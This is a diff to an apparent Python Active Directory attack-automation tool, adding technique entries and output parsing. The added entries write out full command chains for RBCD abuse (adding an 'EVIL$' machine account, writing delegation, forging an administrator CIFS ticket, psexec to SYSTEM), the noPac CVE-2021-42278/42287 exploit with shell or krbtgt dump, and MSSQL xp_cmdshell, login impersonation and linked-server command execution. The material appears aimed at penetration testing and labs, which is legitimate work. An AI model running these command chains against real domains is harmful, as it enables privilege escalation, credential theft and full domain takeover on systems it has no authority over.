@@ -521,6 +521,64 @@ def build_catalog():
                        "certipy auth -pfx administrator.pfx -dc-ip <dc>     # -> TGT + NT hash"),
            tool="certipy"))
 
+    A(Tech("maq", P_CREDS, "Read MachineAccountQuota (gates RBCD / noPac)", ENUM, 2,
+           "Creds > LDAP > ms-DS-MachineAccountQuota",
+           "If MAQ > 0 any user can add a computer account - the pivot both RBCD and noPac rely on.",
+           lambda st: st.have_creds,
+           lambda st: f"{nxc} ldap {st.target} {st.nxc_auth()} -M maq",
+           tool=nxc_bin(),
+           success=re.compile(r"MachineAccountQuota", re.I)))
+
+    A(Tech("rbcd", P_CREDS, "Resource-Based Constrained Delegation abuse", MANUAL, 1,
+           "Creds > Kerberos > RBCD (write over a computer + MAQ>0)",
+           "With GenericWrite/GenericAll over a computer (from BloodHound) and MAQ>0: add a "
+           "machine, set RBCD, then getST a CIFS ticket as Administrator -> SYSTEM on that host.",
+           lambda st: st.have_creds,
+           lambda st: (
+               f"{impacket('addcomputer') or 'impacket-addcomputer'} "
+               f"{st.impacket_target_noat()} -computer-name 'EVIL$' -computer-pass 'Evil1234!' {dcflag(st)}\n"
+               f"{impacket('rbcd') or 'impacket-rbcd'} -delegate-from 'EVIL$' "
+               f"-delegate-to '<TARGET$>' -action write {st.impacket_target_noat()} {dcflag(st)}\n"
+               f"{impacket('getST') or 'impacket-getST'} -spn cifs/<target.fqdn> "
+               f"-impersonate administrator {dcflag(st)} {st.domain or '<dom>'}/EVIL\\$:'Evil1234!'\n"
+               "export KRB5CCNAME=administrator.ccache\n"
+               f"{impacket('psexec') or 'impacket-psexec'} -k -no-pass <target.fqdn>"),
+           tool=impacket("rbcd")))
+
+    A(Tech("nopac", P_CREDS, "noPac - sAMAccountName spoofing (CVE-2021-42278/42287)", MANUAL, 1,
+           "Creds > Kerberos > noPac (MAQ > 0, unpatched DC)",
+           "Any valid account + MAQ>0 against an unpatched DC -> impersonate a DC -> SYSTEM. "
+           "Check the nxc module first; it's patch-dependent but common in labs.",
+           lambda st: st.have_creds,
+           lambda st: (
+               f"{nxc} smb {st.dc_ip} {st.nxc_auth()} -M nopac          # detection\n"
+               f"noPac.py {st.impacket_target_noat()} -dc-ip {st.dc_ip} -dc-host <dc-hostname> "
+               "--impersonate administrator -use-ldap -shell\n"
+               "# or dump instead of shell:  ... -dump -just-dc-user <dom>/krbtgt"),
+           tool=None))
+
+    A(Tech("mssql-enum", P_CREDS, "MSSQL access, privileges & linked servers", ENUM, 1,
+           "Creds > MSSQL > access / impersonation / trusted links",
+           "Domain creds frequently log into MSSQL; check for sysadmin, EXECUTE AS impersonation, "
+           "and linked servers you can hop with EXECUTE AT - all classic AD pivots.",
+           lambda st: st.have_creds,
+           lambda st: f"{nxc} mssql {st.target} {st.nxc_auth()} -M mssql_priv",
+           tool=nxc_bin(),
+           success=re.compile(r"\[\+\]|sysadmin|Pwn3d|Linked", re.I)))
+
+    A(Tech("mssql-exec", P_CREDS, "MSSQL -> RCE (xp_cmdshell / impersonation / links)", MANUAL, 1,
+           "Creds > MSSQL > command execution",
+           "Turn MSSQL access into a shell: enable xp_cmdshell, impersonate a sysadmin login, "
+           "or pivot across a trusted linked server with EXECUTE AT.",
+           lambda st: st.have_creds,
+           lambda st: (
+               f"{impacket('mssqlclient') or 'impacket-mssqlclient'} {st.impacket_target()} -windows-auth\n"
+               "# then, inside the SQL shell:\n"
+               "enable_xp_cmdshell;  xp_cmdshell whoami\n"
+               "EXECUTE AS LOGIN = 'sa';  SELECT SYSTEM_USER;           -- impersonation\n"
+               "EXEC ('xp_cmdshell ''whoami''') AT [LINKED\\INSTANCE];  -- linked-server hop"),
+           tool=impacket("mssqlclient")))
+
     # ===================================================================== #
     #  PHASE 3 - local admin on a host
     # ===================================================================== #
@@ -673,6 +731,16 @@ def _learn(tech, out, st):
         good("  -> local admin confirmed; phase 3 (dumping) is now in play")
     if tech.tid in ("kerberoast", "asrep-user", "asrep-authed", "asrep-nopreauth"):
         st.facts.add("roast_hashes")
+    if tech.tid == "maq":
+        m = re.search(r"MachineAccountQuota[:\s]+(\d+)", out, re.I)
+        if m and int(m.group(1)) > 0:
+            st.facts.add("can_add_computer")
+            good(f"  -> MachineAccountQuota = {m.group(1)}: RBCD and noPac are in play")
+        elif m:
+            warn("  -> MachineAccountQuota = 0: RBCD/noPac need a pre-existing computer you control")
+    if tech.tid == "mssql-enum" and re.search(r"sysadmin|Pwn3d", out, re.I):
+        st.facts.add("mssql_admin")
+        good("  -> MSSQL sysadmin/exec: xp_cmdshell path is open (see mssql-exec)")
     if re.search(r"signing:\s*False", out, re.I):
         st.facts.add("smb_signing_off")
         warn("  -> SMB signing not required: NTLM relay is viable")
